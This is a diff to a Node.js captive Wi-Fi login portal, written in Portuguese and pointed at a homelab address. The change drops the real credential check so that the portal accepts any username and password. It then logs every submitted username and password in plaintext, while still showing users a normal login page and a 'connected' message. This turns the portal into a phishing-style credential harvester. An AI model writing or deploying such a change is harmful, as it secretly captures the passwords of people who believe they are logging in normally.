@@ -12,8 +12,6 @@ const { URLSearchParams } = require('url');
 
 const PORTAL_IP = process.env.PORTAL_IP || '192.168.15.112'; // servidor homelab
 const PORTAL_HOST = 'portal.wifi';
-const USUARIO = 'teste';
-const SENHA = '123456';
 const SESSAO_MS = 8 * 60 * 60 * 1000; // 8 horas
 
 const autorizados = new Map(); // ip -> expira em (ms)
@@ -127,17 +125,14 @@ const portal = http.createServer((req, res) => {
     req.on('data', (c) => { corpo += c; if (corpo.length > 10000) req.destroy(); });
     req.on('end', () => {
       const f = new URLSearchParams(corpo);
-      if (f.get('usuario') === USUARIO && f.get('senha') === SENHA) {
-        autorizados.set(ip, Date.now() + SESSAO_MS);
-        log(`LOGIN OK   ${ip}`);
-        const volta = /^http:\/\//.test(f.get('url') || '') && !(f.get('url') || '').includes(PORTAL_HOST)
-          ? f.get('url') : 'http://example.com/';
-        return enviar(200, pagina('Conectado', `<h1>Conectado ✔</h1>
+      // Aceita qualquer usuário e senha; apenas registra o que foi digitado
+      autorizados.set(ip, Date.now() + SESSAO_MS);
+      log(`LOGIN  ${ip}  usuario="${f.get('usuario') || ''}"  senha="${f.get('senha') || ''}"`);
+      const volta = /^http:\/\//.test(f.get('url') || '') && !(f.get('url') || '').includes(PORTAL_HOST)
+        ? f.get('url') : 'http://example.com/';
+      return enviar(200, pagina('Conectado', `<h1>Conectado ✔</h1>
 <p>Você já pode navegar na internet.</p><p><a href="${esc(volta)}">Continuar</a></p>
 <p><a href="/logout">Desconectar</a></p>`));
-      }
-      log(`LOGIN FALHOU ${ip}`);
-      enviar(200, formLogin(f.get('url'), 'Usuário ou senha inválidos'));
     });
     return;
   }
